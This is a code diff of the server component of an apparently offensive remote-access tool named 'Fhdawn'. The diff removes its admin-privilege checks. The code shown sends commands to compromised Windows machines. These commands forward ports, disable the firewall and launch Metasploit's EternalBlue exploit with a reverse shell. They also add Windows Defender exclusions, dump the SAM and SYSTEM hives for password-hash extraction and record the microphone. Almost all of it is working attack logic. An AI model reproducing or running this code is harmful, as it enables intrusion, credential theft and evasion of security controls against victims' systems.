@@ -87,86 +87,86 @@ class ClientManage:
             # Forward port
             # Create Metasploit RC File.
             # Run the Metasploit RC File.
-            if(elevated):
-                if(self.attack_port[0] == "445"):
-                    cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
-                        lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
-                    )
-                    print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
-                    print("[+] Forwarding Port.")
+            #if(elevated):
+            if(self.attack_port[0] == "445"):
+                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
+                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
+                )
+                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
+                print("[+] Forwarding Port.")
 
-                    
-                    
-                    self.SendData("cmd.exe /c " + cmdstr)
-                    self.WaitForReply()
-                    time.sleep(2)
-                    print("[+] Disabling firewall.")
-                    
-                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
-                    self.WaitForReply()
-                    with open("maalik_attack.rc", "w+") as rcfile:
-                        rcfile.write("use exploit/windows/smb/ms17_010_eternalblue\n")
-                        rcfile.write("set payload generic/shell_reverse_tcp\n")
-                        rcfile.write("set LHOST 0.0.0.0\n")
-                        rcfile.write("set RHOST " + str(ip.split(":")[0]) + "\n")
-                        rcfile.write("set RPORT " + str(self.exploit_port[0]) + "\n")
-                        rcfile.write("run")
+                
+                
+                self.SendData("cmd.exe /c " + cmdstr)
+                self.WaitForReply()
+                time.sleep(2)
+                print("[+] Disabling firewall.")
+                
+                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
+                self.WaitForReply()
+                with open("maalik_attack.rc", "w+") as rcfile:
+                    rcfile.write("use exploit/windows/smb/ms17_010_eternalblue\n")
+                    rcfile.write("set payload generic/shell_reverse_tcp\n")
+                    rcfile.write("set LHOST 0.0.0.0\n")
+                    rcfile.write("set RHOST " + str(ip.split(":")[0]) + "\n")
+                    rcfile.write("set RPORT " + str(self.exploit_port[0]) + "\n")
+                    rcfile.write("run")
 
+                try:
+                    subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
+                    
+                    self.SendData("cmd.exe /c netsh interface portproxy reset")
+                    self.WaitForReply()
+                    print("[+] Enabling firewall.")
+                    
+                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
+                    self.WaitForReply()
+                    
+                except OSError as e:
+                    if e.errno == errno.ENOENT:
+                        print("[X] Failed to run Metasploit, Is it installed?")
+                    else:
+                        print("[X] Failed to run Metasploit, Error : " + str(e))
+                
+            else:
+                print("[*] Incompatible port for Auto Pivot Exploit.")
+                print("[*] Supported Ports is 445 (smb) for Eternalblue.")
+            # else:
+            #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
+        def Attack():
+            # if(elevated):
+            if(len(self.exploit_port) == 0):
+                self.exploit_port.append(random.randint(1000, 9000))
+            else:
+                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
+                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
+                )
+                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
+                print("[+] Forwarding Port.")
+
+                
+                
+                self.SendData("cmd.exe /c " + cmdstr)
+                self.WaitForReply()
+                time.sleep(2)
+                print("[+] Disabling firewall.")
+                
+                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
+                self.WaitForReply()
+                print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
+                print("[+] All Traffic sent on " + ip.split(":")[0] + ":" + str(self.exploit_port[0]) + " will be forwarded to " + self.attack_host[0] + ":" + self.attack_port[0])
+                print("[*] Press CTRL+C when Done.")
+                while(True):
                     try:
-                        subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
+                        prompt("")
+                    except KeyboardInterrupt:
                         
                         self.SendData("cmd.exe /c netsh interface portproxy reset")
                         self.WaitForReply()
-                        print("[+] Enabling firewall.")
                         
-                        self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
-                        self.WaitForReply()
-                        
-                    except OSError as e:
-                        if e.errno == errno.ENOENT:
-                            print("[X] Failed to run Metasploit, Is it installed?")
-                        else:
-                            print("[X] Failed to run Metasploit, Error : " + str(e))
-                    
-                else:
-                    print("[*] Incompatible port for Auto Pivot Exploit.")
-                    print("[*] Supported Ports is 445 (smb) for Eternalblue.")
-            else:
-                print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
-        def Attack():
-            if(elevated):
-                if(len(self.exploit_port) == 0):
-                    self.exploit_port.append(random.randint(1000, 9000))
-                else:
-                    cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
-                        lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
-                    )
-                    print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
-                    print("[+] Forwarding Port.")
-
-                    
-                    
-                    self.SendData("cmd.exe /c " + cmdstr)
-                    self.WaitForReply()
-                    time.sleep(2)
-                    print("[+] Disabling firewall.")
-                    
-                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
-                    self.WaitForReply()
-                    print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
-                    print("[+] All Traffic sent on " + ip.split(":")[0] + ":" + str(self.exploit_port[0]) + " will be forwarded to " + self.attack_host[0] + ":" + self.attack_port[0])
-                    print("[*] Press CTRL+C when Done.")
-                    while(True):
-                        try:
-                            prompt("")
-                        except KeyboardInterrupt:
-                            
-                            self.SendData("cmd.exe /c netsh interface portproxy reset")
-                            self.WaitForReply()
-                            
-                            break
-            else:
-                print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
+                        break
+            # else:
+            #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
 
         def filetransfer(mfile = None, rfile=None):
             if(mfile == None and rfile == None):
@@ -369,17 +369,17 @@ class ClientManage:
                 elif ( main == "windefender_exclude"):
                     path = prompt("[+] Path on Remote PC ( File / Folder ) : ")
                     if(len(path) > 0):
-                        if(elevated == True):
+                        #if(elevated == True):
                         # self.SendData("exclude")
                         # self.SendData(path)
-                            strs = "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '{s}'".format(s = path)
-                            self.SendData(strs)
-                            time.sleep(3)
-                            print("[+] Exclusion added.") # Not checking it.. according to my tests, It works. 
-                            # But I should add checking
-                            # how can we check for exlcusions O_o
-                        else:
-                            print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.") 
+                        strs = "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '{s}'".format(s = path)
+                        self.SendData(strs)
+                        time.sleep(3)
+                        print("[+] Exclusion added.") # Not checking it.. according to my tests, It works. 
+                        # But I should add checking
+                        # how can we check for exlcusions O_o
+                        # else:
+                        #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.") 
 
                 elif ( main == "systeminfo"):
                     self.SendData("systeminfo")
@@ -429,22 +429,22 @@ class ClientManage:
                         end = scanRange[1]
                         xip = get[3]
                         base = get[0] +"."+ get[1] +"."+ get[2] +"."
-                        silent = True
+                        
                         try:
                             for i in range(int(xip), int(end)):
+                                if not silent:
+                                    silent = True
                                 ip_toscan = base + str(i)
                                 #print("Scanning : " + ip_toscan)
                                 self.SendData("checkhost")
                                 self.SendData(ip_toscan)
                                 self.WaitForReply()
-                            
+                            silent = False
                         except KeyboardInterrupt:
                             silent = False
-                            
-                        silent = False
                     except Exception as e:
                         print("[X] Error : " + str(e))
-
+                    
                 elif(main == "show targets"):
                     if(len(self.remote_hosts_list) > 0):
                         for host in self.remote_hosts_list:
@@ -669,30 +669,30 @@ Open Ports
                     print(help)
 
                 elif(main == "samdump"):
-                    if(elevated):
-                        self.SendData("cmd.exe /c reg save hklm\sam sam")
-                        self.WaitForReply()
-                        self.SendData("cmd.exe /c reg save hklm\system system")
-                        self.WaitForReply()
-                        self.SendData("fupload:sam")
-                        self.WaitForReply()
-                        self.SendData("fupload:system")
-                        self.WaitForReply()
-                        self.SendData("delete:sam")
-                        self.WaitForReply()
-                        self.SendData("delete:system")
+                    #if(elevated):
+                    self.SendData("cmd.exe /c reg save hklm\sam sam")
+                    self.WaitForReply()
+                    self.SendData("cmd.exe /c reg save hklm\system system")
+                    self.WaitForReply()
+                    self.SendData("fupload:sam")
+                    self.WaitForReply()
+                    self.SendData("fupload:system")
+                    self.WaitForReply()
+                    self.SendData("delete:sam")
+                    self.WaitForReply()
+                    self.SendData("delete:system")
 
-                        if(os.path.isfile("downloads/sam")):
-                            if(os.path.isfile("downloads/system")):
-                                subprocess.call(["samdump2", "downloads/system", "downloads/sam"]) # works on kali without errors
-                                os.remove("downloads/system")
-                                os.remove("downloads/sam")
-                            else:
-                                print("[+] Error dumping system.")
+                    if(os.path.isfile("downloads/sam")):
+                        if(os.path.isfile("downloads/system")):
+                            subprocess.call(["samdump2", "downloads/system", "downloads/sam"]) # works on kali without errors
+                            os.remove("downloads/system")
+                            os.remove("downloads/sam")
                         else:
-                            print("[+] Error dumping sam.")
+                            print("[+] Error dumping system.")
                     else:
-                        print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first..")
+                        print("[+] Error dumping sam.")
+                    # else:
+                    #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first..")
                 
                 elif(main == "capturemic"):
                     seconds = prompt("[?] Recording time in seconds : ")
@@ -759,7 +759,6 @@ Open Ports
         Wait 20 seconds for Message from Client
         """
         self.clearLog() # Clear log list
-        time.sleep(2)
         x = 0 # x is 0
         while(x != 20): # while x is not 20
             try: 
@@ -982,9 +981,8 @@ Open Ports
                 elif(shellmode == True):
                     print("\n"+client_data) # No other information
 
-                else:
-                    if(silent == False):
-                        print("\n["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips = ips) + client_data)
+                elif(silent == False):
+                    print("\n["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips = ips) + client_data)
                     
             except Exception as e:
                 self._clearKick()
